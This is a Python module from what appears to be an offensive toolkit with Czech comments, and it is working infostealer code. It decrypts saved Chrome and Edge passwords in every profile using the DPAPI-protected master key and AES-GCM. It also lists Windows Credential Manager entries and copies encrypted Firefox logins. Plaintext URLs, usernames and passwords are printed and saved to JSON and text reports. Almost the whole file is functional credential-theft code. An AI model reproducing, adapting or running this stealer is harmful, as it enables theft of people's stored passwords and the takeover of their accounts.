# modules/allpass.py
"""
Kompletni extrakce ulozenych hesel: Chrome, Edge, Windows Credential Manager,
WiFi, Firefox (encrypted only).
"""
import base64
import glob
import json
import os
import platform
import shutil
import sqlite3
import subprocess
from datetime import datetime

from colorama import Fore

try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None


def run():
    print(Fore.YELLOW + "[*] Kompletni extrakce hesel...")

    results = {
        "timestamp": datetime.now().isoformat(),
        "machine": platform.node(),
        "user": os.environ.get("USERNAME", "?"),
        "extractions": {},
    }

    _do_chrome(results)
    _do_edge(results)
    _do_windows_credentials(results)
    _do_firefox(results)

    _save(results)


# ---------- jednotlive casti ----------

def _do_chrome(results):
    print(Fore.CYAN + "\n[1] Chrome...")
    if win32crypt is None or AES is None:
        print(Fore.YELLOW + "[!] chybi pywin32/pycryptodome")
        return

    master_key = _get_master_key(
        os.path.join(os.environ.get("USERPROFILE", ""),
                     "AppData", "Local", "Google", "Chrome",
                     "User Data", "Local State")
    )
    if not master_key:
        print(Fore.YELLOW + "[!] Chrome master key nedostupny")
        return

    base = os.path.join(os.environ.get("USERPROFILE", ""),
                        "AppData", "Local", "Google", "Chrome", "User Data")
    entries = _collect_from_profiles(base, master_key)

    print(Fore.GREEN + f"[+] {len(entries)} Chrome hesel")
    if entries:
        _print_sample(entries)
    results["extractions"]["chrome"] = {
        "count": len(entries),
        "passwords": entries[:50],
    }


def _do_edge(results):
    print(Fore.CYAN + "\n[2] Edge...")
    if win32crypt is None or AES is None:
        print(Fore.YELLOW + "[!] chybi zavislosti")
        return

    master_key = _get_master_key(
        os.path.join(os.environ.get("USERPROFILE", ""),
                     "AppData", "Local", "Microsoft", "Edge",
                     "User Data", "Local State")
    )
    if not master_key:
        print(Fore.YELLOW + "[!] Edge master key nedostupny")
        return

    base = os.path.join(os.environ.get("USERPROFILE", ""),
                        "AppData", "Local", "Microsoft", "Edge", "User Data")
    entries = _collect_from_profiles(base, master_key)

    print(Fore.GREEN + f"[+] {len(entries)} Edge hesel")
    results["extractions"]["edge"] = {
        "count": len(entries),
        "passwords": entries[:50],
    }


def _do_windows_credentials(results):
    print(Fore.CYAN + "\n[3] Windows Credential Manager...")
    try:
        r = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True)
    except OSError as e:
        print(Fore.RED + f"[!] {e}")
        return

    creds = []
    current = {}
    for raw in r.stdout.splitlines():
        line = raw.strip()
        if line.startswith("Target:"):
            if current:
                creds.append(current)
            current = {"target": line.replace("Target:", "").strip()}
        elif line.startswith("Type:"):
            current["type"] = line.replace("Type:", "").strip()
        elif line.startswith("User:"):
            current["user"] = line.replace("User:", "").strip()
    if current:
        creds.append(current)

    print(Fore.GREEN + f"[+] {len(creds)} credentials")
    results["extractions"]["windows_credentials"] = {
        "count": len(creds),
        "credentials": creds,
    }


def _do_firefox(results):
    print(Fore.CYAN + "\n[4] Firefox...")
    profiles = glob.glob(os.path.join(
        os.environ.get("APPDATA", ""),
        "Mozilla", "Firefox", "Profiles", "*.default*",
    ))
    if not profiles:
        print(Fore.YELLOW + "[!] Firefox profily nenalezeny")
        return

    logins_path = os.path.join(profiles[0], "logins.json")
    if not os.path.exists(logins_path):
        print(Fore.YELLOW + "[!] logins.json nenalezen")
        return

    try:
        with open(logins_path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, json.JSONDecodeError) as e:
        print(Fore.RED + f"[!] {e}")
        return

    logins = data.get("logins", [])
    print(Fore.YELLOW + f"[*] {len(logins)} Firefox logins (encrypted)")
    results["extractions"]["firefox"] = {
        "count": len(logins),
        "note": "encrypted, vyzaduje master password",
        "logins": logins[:10],
    }


# ---------- helpery ----------

def _get_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            state = json.load(f)
        enc = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except (OSError, KeyError, ValueError):
        return None


def _collect_from_profiles(user_data_dir, master_key):
    """Projde Default, Profile 1, Profile 2, ..."""
    entries = []
    if not os.path.isdir(user_data_dir):
        return entries

    for name in sorted(os.listdir(user_data_dir)):
        if name != "Default" and not name.startswith("Profile "):
            continue
        db = os.path.join(user_data_dir, name, "Login Data")
        if not os.path.exists(db):
            continue
        entries.extend(_read_logins(db, master_key))
    return entries


def _read_logins(db_path, master_key):
    tmp = db_path + ".mole_tmp"
    try:
        shutil.copy2(db_path, tmp)
        conn = sqlite3.connect(tmp)
        try:
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cur.fetchall()
        finally:
            conn.close()
    except (OSError, sqlite3.Error):
        return []
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass

    out = []
    for url, user, enc in rows:
        if not enc:
            continue
        plain = _decrypt(enc, master_key)
        if plain is None:
            continue
        out.append({"url": url, "username": user, "password": plain})
    return out


def _decrypt(enc, master_key):
    if enc[:3] in (b"v10", b"v11"):
        try:
            nonce, ct_tag = enc[3:15], enc[15:]
            ct, tag = ct_tag[:-16], ct_tag[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct, tag).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            return None
    try:
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8")
    except Exception:
        return None


def _print_sample(entries):
    for i, e in enumerate(entries[:3], 1):
        print(Fore.CYAN + f"  {i}. {e['url'][:50]}")
        print(Fore.WHITE + f"     {e['username'][:30]} / {e['password'][:20]}")


def _save(results):
    out_dir = os.path.join(_results_dir(), "AllPass")
    os.makedirs(out_dir, exist_ok=True)

    # souhrn pocitadel
    total = 0
    for name, data in results["extractions"].items():
        if "count" in data:
            total += data["count"]
    results["summary"] = {
        "total_items": total,
        "categories": list(results["extractions"].keys()),
    }

    json_path = os.path.join(out_dir, "AllPass.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=4, ensure_ascii=False)

    txt_path = os.path.join(out_dir, "PASSWORD_SUMMARY.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("=" * 70 + "\n")
        f.write("COMPLETE PASSWORD EXTRACTION REPORT\n")
        f.write("=" * 70 + "\n\n")
        f.write(f"Machine: {results['machine']}\n")
        f.write(f"User:    {results['user']}\n")
        f.write(f"Date:    {results['timestamp']}\n")
        f.write(f"Total:   {total}\n\n")

        for name, data in results["extractions"].items():
            f.write(f"\n{name.upper()}:\n")
            if "count" in data:
                f.write(f"  count: {data['count']}\n")
            for pw in (data.get("passwords") or [])[:3]:
                f.write(f"  - {pw.get('url','')[:50]}\n")
                f.write(f"    {pw.get('username','')} / {pw.get('password','')[:20]}\n")

        f.write("\n" + "=" * 70 + "\n")

    print(Fore.GREEN + f"\n[+] Ulozeno: {json_path}")
    print(Fore.GREEN + f"[+] Souhrn: {txt_path}")


def _results_dir():
    here = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(os.path.dirname(here), "results")